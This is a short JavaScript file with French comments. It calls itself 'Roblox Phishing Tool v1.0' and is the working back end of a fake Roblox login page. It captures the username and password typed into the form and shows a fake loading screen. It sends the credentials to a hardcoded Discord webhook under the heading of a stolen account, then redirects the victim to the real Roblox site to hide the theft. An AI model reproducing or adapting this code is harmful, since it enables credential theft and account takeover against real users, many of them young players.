// Ton webhook URL
const WEBHOOK_URL = "https://discord.com/api/webhooks/1538723870050095204/oZWJ3gD5uDClYngLjnV1cJU3EHxoFHNPyISpMStVadt5RFT64A0I1PVJ44OL-Ri-EFvY";

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault(); // Empêche la page de recharger normalement

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    // Date et heure de la capture
    const date = new Date().toLocaleString();

    // Afficher un faux chargement pour faire croire que ça marche
    const form = document.getElementById('loginForm');
    form.classList.add('hidden');
    document.getElementById('loading').classList.remove('hidden');

    // Préparation des données pour Discord (Embed)
    const payload = {
        "content": null,
        "embeds": [
            {
                "title": "🔒 Nouveau compte Roblox volé !",
                "color": 15158332, // Couleur rouge/orange pour attirer l'attention
                "fields": [
                    {
                        "name": "👤 Identifiant / Email",
                        "value": username,
                        "inline": true
                    },
                    {
                        "name": "🔑 Mot de passe",
                        "value": password,
                        "inline": true
                    },
                    {
                        "name": "🕒 Date de capture",
                        "value": date,
                        "inline": false
                    }
                ],
                "footer": {
                    "text": "Roblox Phishing Tool v1.0"
                },
                "timestamp": new Date().toISOString()
            }
        ]
    };

    // Envoi vers le webhook Discord
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    }).then(response => {
        if (response.ok) {
            console.log("Données envoyées avec succès !");
            // Redirection vers le vrai site Roblox après un court délai pour la forme
            setTimeout(() => {
                window.location.href = "https://www.roblox.com/home";
            }, 1000);
        } else {
            console.error("Erreur envoi webhook");
            window.location.href = "https://www.roblox.com/home";
        }
    }).catch(error => {
        console.error("Erreur réseau", error);
        window.location.href = "https://www.roblox.com/home";
    });
});
